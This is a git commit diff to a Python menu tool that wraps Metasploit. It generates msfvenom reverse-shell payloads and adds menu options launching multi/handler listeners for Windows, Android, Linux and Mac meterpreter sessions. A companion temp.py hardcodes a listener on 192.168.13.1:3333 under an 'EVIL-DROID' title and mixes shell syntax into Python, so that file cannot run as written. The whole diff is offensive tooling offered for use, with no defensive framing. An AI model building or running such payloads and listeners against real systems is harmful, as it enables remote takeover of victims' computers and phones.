62d3e0bef72d8746e39770e79e9dc9d3a58f9781
arshit09 <arshitvaghasiya29@gmail.com>
2019-07-23 10:59:34 -0400

    added listener

--- ezzz.py
+++ ezzz.py
@@ -22,7 +22,6 @@ print("4) Tools For Fun!\n")
 print("99) Quit\n"+color.END)
 
 val = int(input(color.BOLD+"Select Your Option To Begin Your Journey : "))
-print(val)
 for x in range(44):
 	sys.stdout.write("-")
 
@@ -56,6 +55,38 @@ if val == 1:
 		portno = input("Enter Unique Port No : ")
 		pname = input("Enter Payload Name : ")
 		cmnd = "msfvenom -p osx/x86/shell_reverse_tcp lhost="+ip+" lport="+portno+" -f macho -o ~/Desktop/"+pname+".macho"
+		os.system(cmnd)
+
+if val == 2:
+	print(color.YELLOW+color.BOLD+"\nSelect Listener For Your Payload Accordingly\n"+color.END)
+	print(color.GREEN + color.BOLD + "\n1) Windows")
+	print("2) Android")
+	print("3) Linux")
+	print("4) Mac" + color.END)
+	listener = int(input("Select Option : "))
+	if listener == 1:
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		print(color.YELLOW + "Just a second..." + color.END)
+		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+		os.system(cmnd)
+	if listener == 2:
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		print(color.YELLOW + "Just a second..." + color.END)
+		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+		os.system(cmnd)
+	if listener == 3:
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		print(color.YELLOW + "Just a second..." + color.END)
+		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
+		os.system(cmnd)
+	if listener == 4:
+		ip = input("Enter IP Address : ")
+		portno = input("Enter Unique Port No : ")
+		print(color.YELLOW + "Just a second..." + color.END)
+		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"
 		os.system(cmnd)
 
 if val == 99:
--- temp.py
+++ temp.py
@@ -1,5 +1,7 @@
-import socket    
-hostname = socket.getfqdn()    
-IPAddr = socket.gethostbyname(hostname)    
-print("Your Computer Name is:" + hostname)    
-print("Your Computer IP Address is:" + IPAddr)
+import os
+a = "msfconsole -x 'use multi/handler; set LHOST 192.168.13.1; set LPORT 3333; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+os.system(a)
+
+xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST 192.168.13.1; set LPORT 3333; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+
+#xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
